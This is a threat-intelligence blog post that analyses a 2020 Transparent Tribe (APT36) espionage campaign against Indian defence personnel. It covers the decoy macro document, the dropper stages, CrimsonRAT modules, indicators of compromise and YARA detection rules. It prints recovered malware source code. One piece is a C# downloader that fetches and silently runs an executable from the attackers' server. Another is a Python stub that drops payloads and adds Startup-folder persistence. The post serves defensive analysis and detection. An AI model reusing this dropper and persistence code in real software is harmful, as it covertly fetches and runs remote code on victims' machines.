# Reference for threat actor for "Transparent Tribe, APT 36"

**Title**: Transparent Tribe: Four Years Later - Yoroi

**Source**: https://blog.yoroi.company/research/transparent-tribe-four-years-later/

## Content







Transparent Tribe: Four Years Later - Yoroi











































































 












Home






Defence center






Threat intelligence






Solutions







Before Attack







Technologies







Threat intelligence






DNS Defence






Kanwa






Genku






Digital Surveillance








Services







Infrastructure & Systems compliance






Scam Protection






SCADA Security






Early Warning






Wi-Fi Infrastructure Assessment






Vulnerability Assessment






Adversarial Simulation






Threat Hunting






SIEM management






Security Infrastructure Assessment (SIA)






Penetration Testing










During Attack







Technologies







Threat intelligence






Kanwa






Yomi






Email Protection








Services







IRT (Incident Response Team)






Managed Advanced Threat Protection






KickBack Attack










After Attack







Technologies







Threat intelligence






Kanwa








Services







Wi-Fi Infrastructure Assessment






Threat Hunting












Blogs







Yoroi Blog






Marco Ramilli Blog








Downloads






About us






Contacts






English







Italiano






Transparent Tribe: Four Years Later
	02/21/2020
Introduction
Operation Transparent Tribe was first spotted by Proofpoint Researchers in Feb 2016, in a series of espionages operations against Indian diplomats and military personnel in some embassies in Saudi Arabia and Kazakhstan. At that time, the researchers tracked the sources IP in Pakistan, the attacks were part of a wider operation that relies on multi vector such as watering hole websites and phishing email campaigns delivering custom RATs dubbed Crimson and Peppy. These RAT are capable of exfiltrate information, take screenshot and record webcam streams.
This threat actor has been vanished for a long period, and only the last month appeared another time probably for the actual tensions between two countries. We noticed that the TTP of the group are almost the same leveraging a weaponized document with a fake certificate of request of an Indian public fund. So, Cybaze-Yoroi ZLab team decided to dive deep into a technical analysis.
Technical Analysis
Hash662c3b181467a9d2f40a7b632a4b5fe5ddd201a528ba408badbf7b2375ee3553ThreatNew Operation Transparent Tribe CampaignBrief DescriptionMalicious macro document of the new Campaign of Transparent TribeSsdeep24576:Nh2axIaansJlyJ1prFnFmbX3ti6iEIb+R9mSXH9tBUnTqHT:Nhfx4nsPyJ1ppnEX3UCICRhXHXe
Table 1. Static information about the malicious macro 
The document presents itself as a request for a DSOP FUND (Defence Services Officers Provident Fund). It is a fund where an officer compulsorily deposits some money to Govt on a monthly basis out of his wages / salary. 
The Found is a financial planning for defense personnel. The money is kept by the government and in return a “non-permanent” profit officially titled as “interest” is given back to the officers at the end of each year. The DSOP fund scheme has been setup as a “welfare measure” to the depositors while the wages remain barely meeting ends otherwise.

Self-Extracting Macro
Analyzing the content of the Excel file, we notice that the file contains all the necessary components to perform the infection:

The macro is not heavily obfuscated. The macro components are hidden as Hex or Decimal strings, which will be combined with each other to unleash the next stage of the infection.
Then it is possible to deobfuscate them.

The macro creates two folders inside %PROGRAMDATA% path, “systemidleperf” and “SppExtComTel”. 

Analyzing these files, we have a vbs script, a C# script and a zip file, inside this archive we found 4 PE artifacts:

The SilentCMD Module
The two dll are legit windows library and are used in support of the malicious behaviour. Instead, the “windproc.scr” and “windprocx.scr” files are the compiled version of the utility SilentCMD publicly available on GitHub. SilentCMD executes a batch file without opening the command prompt window. If required, the console output can be redirected to a log file.

The SilentCMD utility is used to execute the commands pushed from the C2, and all of them will be executed without showing anything to the user. However, as previously mentioned, it is curious to notice that the malware installs two different variants of the executable, with the only difference in timestamp:

The Real Time Module
The other extracted file is the “Realtime.cs” file, which is the source of a piece of code written in C#, and it is compiled and run during the execution of the macro. The code is very simple and it has the only purpose to download another component from the internet: 
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
namespace Realtime
{
    class Program
    {
        static void Main(string[] args)
        {
            
            WebClient wc = new WebClient();
            wc.DownloadFile("http://www.awsyscloud.com/x64i.scr", @"c:\\programdata\\systemidleperf\\x64i.scr");
            Process proc = new Process();
            proc.StartInfo.FileName = Convert.ToString(args[0]);
            proc.StartInfo.Arguments = "/c " + Convert.ToString(args[1]);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.CreateNoWindow = false;
            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            proc.Start();
            Environment.Exit(0);
            //Application.Exit();
            /* if (!proc.Start())
             {
                 //Console.WriteLine("Error starting");
                 return;
             }*/
            //proc.WaitForExit();
        }
    }
}
The code is really simple, it has the function of downloading the file “x64i.scr” from the dropurl “awsysclou[.com” and then saves it into the folder “c:\programdata\systemidleperf\”. The file is immediately executed through the C# primitives.
The X64i.scr File
Hash7b455b78698f03c0201b2617fe94c70eb89154568b80e0c9d2a871d648ed6665ThreatNew Operation Transparent Tribe CampaignBrief DescriptionPython stub malware of the new Campaign of Transparent TribeSsdeep196608:jXm2jfTjEzWt7+eW3TAPHULULN3erOAjsjAbpSzZTfuHO0y7:Lm2jfTgWt65U4UL9eCDHzZfyG7Icon
Table 2. Static information about the Pyhton Stub
The icon of the executable let us understand that the malware has been forged through the usage of the tool Pyinstaller. It is a tool that permits a user to create a complete self-contained executable starting from a python source code. However, the two main disadvantages of choosing this solution are the high footprint of the executable (reaching more than 7.5MB and this generates a lot of noise inside the system); and the easiness to reverse the executable to obtain the source code.
So, after the operation of reversing, the extracted code of the malware is the following:
from ctypes import *
import socket, time, os, struct, sys
from ctypes.wintypes import HANDLE, DWORD
import platform
import ctypes
import _winreg
import time
import os
import platform
import binascii
import _winreg
import subprocess
bitstream3 = "PAYLOAD_ONE"
bitstream4 = "PAYLOAD_TWO"
oses = os.name
systems = platform.system()
releases = platform.release()
architectures = platform.architecture()[0]
    
def main():
  try:
    runsameagain()
  except Exception as e:
      print str(e)
  
def runsameagain():
    global bitstream3
    binstr = bytearray(binascii.unhexlify(bitstream3))
    if not os.path.exists("c:\programdata\SppExtComTel"):
        os.makedirs("c:\programdata\SppExtComTel")
    WriteFile("c:\programdata\SppExtComTel\SppExtComTel.scr",binstr);
    bootup()
    subprocess.Popen(["c:\programdata\SppExtComTel\SppExtComTel.scr", '--brilliance'])
  
def rundifferentagain():
    global bitstream4
    binstr = bytearray(binascii.unhexlify(bitstream4))
    if not os.path.exists("c:\programdata\SppExtComTel"):
        os.makedirs("c:\programdata\SppExtComTel")
    WriteFile("c:\programdata\SppExtComTel\SppExtComTel.scr",binstr);
    bootup()
    subprocess.Popen(["c:\programdata\SppExtComTel\SppExtComTel.scr", '--brilliance'])
  
def Streamers():     
 try:                               
    rundifferentagain()
    return 1               
 except Exception as e:
    print str(e)
    
def WriteFile(filename,data):
    with open(filename,"wb") as output:
  output.write(data)
  
  
def bootup():
    try:
        from win32com.client import Dispatch
        from win32com.shell import shell,shellcon
  dpath = "c:\programdata\SppExtComTel"
        #print "before"
  Start_path = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, 0, 0)
  com_path = os.path.join(Start_path, "SppExtComTel.lnk")
  target = os.path.join(dpath,"SppExtComTel.scr")
  wDir = dpath
  icon = os.path.join(dpath, "SppExtComTel.scr")
  shell = Dispatch('WScript.Shell')
  shortcut = shell.CreateShortCut(com_path)
  shortcut.Targetpath = target
  shortcut.WorkingDirectory = wDir
  shortcut.IconLocation = icon
  shortcut.save()
        #print "there"
        #return True
    except Exception, e:
        print str(e)
    
if __name__ == "__main__":
  try:
      #print oses
      #print systems
      #print releases
      #print architectures
      if '.py' not in sys.argv[0]:
    #sys.exit()
                #print "nothign to do"
                if systems == 'Windows' and releases == "7":
                    main()
                elif systems == 'Windows' and (releases == "8.1" or releases == "8"):
                    Streamers()
                elif systems == 'Windows' and releases == "10":
                    #print "Please use a 64 bit version of python"
                    #print "entering streamers"
                    Streamers()
                else:
                    Streamers()
  except Exception as e:
    print str(e)
Code snippet 2 
The python code is very simple to analyze and to explain. The first operation is to declare two global variables, “bitstream3” and “bitstream4”. They are the hexadecimal representation of two PE files, that will be deepened in the next sections. These two files are chosen according to the Windows OS version, as visible at the bottom of the code.
After that, the script writes the desired payload into the folder “c:\programdata\SppExtComTel\” and immediately executed it with the parameter “–brilliance”. After that, the malware guarantees its persistence through the  creation of a LNK file inside the Startup folder.

The RAT
As previously stated, the malware payload is the core component of the malware implant. 
As shown in the above figure, the malware is written in .NET framework and the creation date back to 29 Jan 2020. It is the date of the beginning of the malware campaign, also demonstrated by the registration records of the C2. The malware consists of a modular implant that downloads other components from the C2.

The first operation is to provide to the C2 a list of the running processes on the victim machine: 

The method used to send the information to the C2 is the following:

Figure 11: C2 communication routine
After that, the malware loops in a cycle and waits for some commands coming from the C2:

Figure 12: Routine for the download of new modules
When the C2 sends some commands to instruct the bot, the malware downloads and executes other two components, which are two DLLs downloaded from the following URLs:
http[://awsyscloud[.com/E@t!aBbU0le8hiInks/B/3500/m1ssh0upUuchCukXanevPozlu[.dllhttp[://awsyscloud[.com/E@t!aBbU0le8hiInks/D/3500/p2ehtHero0paSth3end.dll
The first DLL, once executed, has been renamed in “indexerdervice.dll”. This executable has got a sophisticated encryption method of communication with the C2: 
When the C2 sends some commands to instruct the bot, the malware downloads and executes other two components, which are two DLLs downloaded from the following URLs:
http[://awsyscloud[.com/E@t!aBbU0le8hiInks/B/3500/m1ssh0upUuchCukXanevPozlu[.dllhttp[://awsyscloud[.com/E@t!aBbU0le8hiInks/D/3500/p2ehtHero0paSth3end.dll
The first DLL, once executed, has been renamed in “indexerdervice.dll”. This executable has got a sophisticated encryption method of communication with the C2: 

Figure 13: Evidence of the decrypting routine of the certificate
The above screen shows that the malware requests for an RSA key, which has to be validated by the highlighted text. If the check is positive, the malware can go on to its malicious actions, such as sending of information: 

Figure 14: Sending routine of the malware
The second malware module is a simple DLL having the purpose to download other components from the dropURL and then install it:

Figure 15: Evidence of the hard coded AES key
The downloaded code has been encrypted through the Rijndael algorithm with a hard coded key.
Conclusion
Transparent tribe is back with a new campaign after several years of (apparently) inactivity. We can confirm that this campaign is completely new, relying on the registration record of the C2 that dates back to 29 January 2020. The decoy document presents itself as a request for a DSOP FUND  (Defence Services Officers Provident Fund) a providence fund for official and military personnel, confirming the espionage and counterintelligence character of this campaign. 
At last, we have no certainty that this campaign has been inactive for 4 years, it may be that it acted quietly, but, now the cyber criminal group is back in view of today’s tensions between the two countries.
Indicators of Compromise
Hashes8e170fab8cdf11b83089706a2bf4a1748844693f4c6f465e7ba89131df089b48113776d3cc8409da498e898bc5e0cafc1762ce1d49e1a86c56b4d841b06efdf839567c9bbbc038574fd1cf569f4f7cfd68403cd817984186b83098ded2433b2c08c0c431f7f63136091854af58cd7f9e6d229f90a9b0fda813c52232c030f6eab111a2fef2a5e89f5dc20d7115c0ac2aa65b3e708eec20a41c00316d14b47472f718a8661be822e03ac31a4495f7f7bcd3f7685f97b44d81459f3f23abf0e376198a5af2125c7c41f531a652d200c083a55a97dc541e3c0b5b253c7329949156ee363abb00f2c72d8e6144d99244288fa30df4877de76ec533ad6c51bc81dfce877426dee9c0954b6c6f7c29b288e97ab0c512fd23eb9ecb13653a15d91ca05acecd41e4e88131a3af162df0239d26c3471658497392649e8dc214bf61939dde0a9fb267567bc7011c766d034a127213d73db7182bb8b31af18e0b15d391b49e2d2ee85092147f08db4ab93b2952e42a971c6c7491985419ac375feda8674c60b0dfb366cc63b4051bd100e5f8d132c400f4c0845d142c723d9c83efd1c52c1f7b455b78698f03c0201b2617fe94c70eb89154568b80e0c9d2a871d648ed6665c84b720430fa64e852740c810afc25cbaec5e4b03b4dea1d3669bc2fb0e54b97Dropurlhxxp://www.[awsyscloud[.com/x64i[.scrComponentsm1ssh0upUuchCukXanevPozlu.dllp2ehtHero0paSth3end.dllC2hxxp://www.[awsyscloud[.com/PersistenceWrite LNK file inside startup menu 
Yara Rules
rule TransparentTribe_Malicious_Macro_Jan_2020 {
    meta:
      description = "Yara rule for the Transparent Tribe Malicious Macro Jan_2020 "
      author = "Yoroi - ZLab"
      last_updated = "2020-02-21"
      tlp = "white"
      category = "informational"
    strings:
      $a1 = {8B 92 BC BE 87 95 BF BD 83}
      $a2 = {D6 8C C7 68 D5 8D C0 69 D4 8E}
	  $b1 = "161,36,31,130,137,165,44,167,244,55,198,100,241"
    condition:
      all of them
}

rule TransparentTribe_PythonStub_Jan_20 {
    meta:
      description = "Yara rule for the Transparent Tribe Python Stub Jan_2020 "
      author = "Yoroi - ZLab"
      last_updated = "2020-02-21"
      tlp = "white"
      category = "informational"
    strings:
      $a1 = {70 56 6B 77 86 FB D2 6D 2C}
      $a2 = {A2 43 F9 97 61 F4 E5 1F D7 02}
	  $b1 = "bpyexpat.pyd"
	  $b2 = "bmfc90u.dll"
	  
    condition:
      uint16(0) == 0x5A4D and all of them and filesize > 7MB
}

rule TransparentTribe_CrimsonRAT_Jan_20 {
    meta:
      description = "Yara rule for the Transparent Tribe CrimsonRAT Jan_2020 "
      author = "Yoroi - ZLab"
      last_updated = "2020-02-21"
      tlp = "white"
      category = "informational"
    strings:
      $a1 = {03 06 11 24 03 06 11 20 03}
      $a2 = {B0 3F 5F 7F 11 D5 0A 3A 04}
	  $b1 = "SppExtComTel"
	  
    condition:
      uint16(0) == 0x5A4D and all of them and filesize > 7MB
}

rule TransparentTribe_MaliciousDLLModule_Jan_20 {
    meta:
      description = "Yara rule for the Transparent Tribe CrimsonRAT Jan_2020 "
      author = "Yoroi - ZLab"
      last_updated = "2020-02-21"
      tlp = "white"
      category = "informational"
    strings:
      $a1 = {00 F1 01 8D 19 71 00 F1 01 7D 06 71}
      $a2 = {86 08 4E 03 57 00 59 00 CC}
	  $a3 = "6f6e6c79706172616e6f696473757276697665" ascii wide
  	  $a4 = "shemypolandar*kotlin" ascii wide
	  $b1 = "FC4302A8973108F7B86565D5A49182DED2B0BF31"
	  $b2 = "PrivateMemorySize64"
	  $b3 = "Hi0-78LoupIks2jMn" wide
    condition:
      uint16(0) == 0x5A4D and (all of ($a*) or all of ($b*)) 
}
This blog post was authored by Luigi Martire, Pietro Melillo and Antonio Pirozzi of Cybaze-Yoroi ZLAB
SeatYoroi S.r.l.Piazza Sallustio, 900187 Roma (RM)Contact[email protected]+39 051 0301005LegalTerms & ConditionsMOG D.Lgs 231/01Privacy PolicyCookie PolicyCode of Ethics andConductWarning systemSubscribe to our early warning systemDownloadsNewsSocialP.IVA. 03407741200 - R.E.A. RM 1559639 - Codice Fiscale 03407741200 - Capitale Sociale: Euro 100.000 IVYoroi S.r.l. società soggetta ad attività di direzione e coordinamento esercitata dalla Tinexta S.p.A.credits: SimpleNetworks
 
×Subscribe to our early warning system

 











Name *




Last Name *




Company *




Email *




Details






Dichiaro di aver letto e compreso l’informativa privacy resa ai sensi dell’art. 13 e autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità e per le finalità ivi descritte.






Autorizzo il Titolare del trattamento alla raccolta dei miei dati personali secondo le modalità descritte nell’informativa privacy per l’invio di comunicazioni commerciali e/o promozionali anche tramite l’invio di newsletter














 


Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso. Cliccando su "Accetta tutti" ti dichiari d'accordo all'utilizzo di cookie analitici (che ci aiutano a capire in che modo gli utenti usano il sito e come migliorarlo, insieme ai nostri servizi) e di tracciamento (inclusi quelli di nostri partner di fiducia) che ci aiutano a decidere quali prodotti mostrarti, a misurare il volume di visite sul nostro sito e a darti la possibilità di mettere "mi piace" e di condividere contenuti direttamente sui social media. Clicca qui per vedere a cosa hai dato il tuo consenso e trovare più informazioni sui cookie che utilizziamo.Read MoreGestisci ImpostazioniRifiuta TuttiAccetta tutti  Manage consent




Close






Privacy Overview 
Questo sito, come la maggior parte dei siti web, utilizza cookie, anche di terze parti, per migliorare la tua esperienza di navigazione e raccogliere informazioni sull'utilizzo del sito stesso.

 





								Necessary							


Necessary

Always Enabled




									I cookie funzionali contribuiscono al buon funzionamento del nostro sito e ti permettono di creare un account, accedere e gestire le tue prenotazioni. Questi cookie ricordano la lingua e la valuta che hai selezionato, le tue ricerche passate e altre preferenze. Si tratta di cookie tecnici che devono essere attivati per poter utilizzare il nostro sito e i nostri servizi.
CookieDurationDescription_GRECAPTCHA5 months 27 daysThis cookie is set by the Google recaptcha service to identify bots to protect the website against malicious spam attacks.cookielawinfo-checkbox-advertisement1 yearSet by the GDPR Cookie Consent plugin, this cookie is used to record the user consent for the cookies in the "Advertisement" category .cookielawinfo-checkbox-analytics11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics".cookielawinfo-checkbox-functional11 monthsThe cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional".cookielawinfo-checkbox-necessary11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary".cookielawinfo-checkbox-others11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other.cookielawinfo-checkbox-performance11 monthsThis cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance".pll_language1 yearThe pll _language cookie is used by Polylang to remember the language selected by the user when returning to the website, and also to get the language information when not available in another way.viewed_cookie_policy11 monthsThe cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data. 






								Performance							


Performance





									Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.
								






								Marketing							


Marketing





									Questo sito e i nostri partner di fiducia usano cookie di terze parti per mostrare messaggi pubblicitari personalizzati su questo sito e su altri siti in base alla tua cronologia di navigazione. Questi cookie vengono usati per integrare i social media sul nostro sito, in modo che tu possa mettere "mi piace" sulle nostre pagine o sui nostri prodotti e condividerli sui social.
CookieDurationDescriptionVISITOR_INFO1_LIVE5 months 27 daysA cookie set by YouTube to measure bandwidth that determines whether the user gets the new or old player interface.YSCsessionYSC cookie is set by Youtube and is used to track the views of embedded videos on Youtube pages.yt-remote-connected-devicesneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt-remote-device-idneverYouTube sets this cookie to store the video preferences of the user using embedded YouTube video.yt.innertube::nextIdneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen.yt.innertube::requestsneverThis cookie, set by YouTube, registers a unique ID to store data on what videos from YouTube the user has seen. 






								Others							


Others





									Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.
								






								Analytics							


Analytics





									I cookie analitici ci aiutano a capire in che modo i clienti come te utilizzano questo sito. In questo modo possiamo migliorare il sito, le app e le comunicazioni e assicurarci di offrire sempre contenuti interessanti e rilevanti.
CookieDurationDescription_gat_gtag_UA_209986505_11 minuteSet by Google to distinguish users.CONSENT2 yearsYouTube sets this cookie via embedded youtube-videos and registers anonymous statistical data. 












SAVE & ACCEPT


Powered by 





















        mobile-menu-eng 


Home







Defence center







Threat intelligence







Solutions



     Solutions  


Before Attack



     Before Attack  


Technologies



     Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance




 Back 



Services



     Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing




 Back 
 Back 



During Attack



     During Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection




 Back 



Services



     Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack




 Back 
 Back 



After Attack



     After Attack  


Technologies



     Technologies  


Threat intelligence







Kanwa




 Back 



Services



     Services  


Wi-Fi Infrastructure Assessment







Threat Hunting




 Back 
 Back 
 Back 



Blogs



     Blogs  


Yoroi Blog







Marco Ramilli Blog




 Back 



Downloads







About us







Contacts







English



     English  


Italiano




 Back 
© 2020 credits: SimpleNetworks     menu-it 


Defence center







Solutions



    Back   Solutions  


Before Attack



    Back   Before Attack  


Technologies



    Back   Technologies  


Threat intelligence







DNS Defence







Kanwa







Genku







Digital Surveillance








Services



    Back   Services  


Infrastructure & Systems compliance







Scam Protection







SCADA Security







Early Warning







Wi-Fi Infrastructure Assessment







Vulnerability Assessment







Adversarial Simulation







Threat Hunting







SIEM management







Security Infrastructure Assessment (SIA)







Penetration Testing









During Attack



    Back   During Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa







Yomi







Email Protection








Services



    Back   Services  


IRT (Incident Response Team)







Managed Advanced Threat Protection







KickBack Attack









After Attack



    Back   After Attack  


Technologies



    Back   Technologies  


Threat intelligence







Kanwa








Services



    Back   Services  


Wi-Fi Infrastructure Assessment







Threat Hunting










Blogs



    Back   Blogs  


Yoroi Blog







Marco Ramilli Blog








Home







Downloads







About us









linkedin





facebook



pinterest



youtube



rss



twitter



instagram





facebook-blank



rss-blank



linkedin-blank



pinterest



youtube



twitter



instagram



































